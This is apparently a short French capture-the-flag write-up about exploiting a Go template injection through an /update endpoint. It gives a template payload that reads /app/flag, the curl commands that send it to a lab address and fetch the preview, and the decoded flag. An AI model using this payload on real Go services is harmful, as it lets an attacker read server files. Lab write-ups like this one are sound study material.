Le endpoint /update nous permet d'écrire n'importe quoi dans template.html

En golang, on peut injecter du code dans des balises html via des curly brackets {{}}

Si le paramètre template est comme ca :
"template": "{{.m.SetTemplateName \"/app/flag\"}}{{.m.ReadFile}}"

Alors on modifie template.html avec le contenu du fichier flag que j'ai trouvé auparavant.

On obtient le flag ainsi:
```bash
curl -X POST http://10.128.0.34/update \
  -H "Content-Type: application/json" \
  -d '{"template": "{{.m.SetTemplateName \"/app/flag\"}}{{.m.ReadFile}}"}' 

curl http://10.128.0.34/preview         
```
[70 76 65 71 45 55 57 56 51 99 51 99 50 99 97 100 56 50 50 50 50 52 102 101 100 48 48 102 101 98 56 48 55 97 53 49 51]

Un tableau de valeur décimale qui en ascii donne :
FLAG-7983c3c2cad822224fed00feb807a513